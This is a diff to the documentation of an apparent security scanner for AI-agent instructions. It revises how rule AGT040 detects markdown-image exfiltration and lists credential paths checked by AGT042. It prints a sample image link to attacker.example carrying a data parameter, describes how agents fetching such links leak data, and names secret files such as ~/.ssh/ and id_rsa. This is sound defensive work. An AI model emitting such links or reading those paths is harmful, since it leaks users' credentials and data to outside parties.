@@ -76,7 +76,7 @@ Instructions that could cause the agent to leak data to external parties.
 | AGT043 | **error** | File-read command near network call within 500 characters |
 
 ### AGT040 — Image Exfiltration
-`![x](https://attacker.example/p?data=SECRET)` causes many agent frameworks to fetch the URL, embedding data in the request. Detected by combining tree-sitter image node extraction with query-parameter analysis.
+`![x](https://attacker.example/p?data=SECRET)` causes many agent frameworks to fetch the URL, embedding data in the request. Flagged when the query string uses a common data-carrying parameter name (`data=`, `token=`, `context=` and similar) or when any value looks like a slot for the model to fill in (`SECRET_DATA`, `{context}`, `<summary>`), which catches sinks that use short or unusual parameter names such as `?d=`.
 
 ### AGT042 — Sensitive Path References
 Checks for mentions of `~/.ssh/`, `~/.aws/`, `.env.production`, `id_rsa`, `ANTHROPIC_API_KEY`, and similar patterns. Any instruction referencing these paths may be directing the agent to read and exfiltrate credentials.
